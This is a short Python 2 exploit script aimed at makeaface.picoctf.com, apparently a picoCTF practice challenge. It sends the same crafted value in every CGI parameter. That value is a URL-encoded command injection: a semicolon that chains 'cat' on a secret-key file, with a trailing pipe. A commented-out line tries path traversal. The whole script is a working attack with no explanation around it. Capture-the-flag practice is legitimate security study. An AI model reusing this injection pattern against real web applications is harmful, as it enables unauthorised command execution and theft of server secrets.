import httplib

def x(p):
  conn = httplib.HTTPConnection("makeaface.picoctf.com")
  conn.request("GET", "/index.cgi?Head=%s&Hair=%s&Nose=%s&Mouth=%s&Eyes=%s" % 
    p)
  r1 = conn.getresponse()
  print r1.status, r1.reason
  data1 = r1.read()
  print len(data1)
  print data1

  conn.close()


#x("head/../head1.bmp")
p = "%20/dev/null%3bcat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8|"
k = (p,   p,    p,    p,    p)    

x(k)




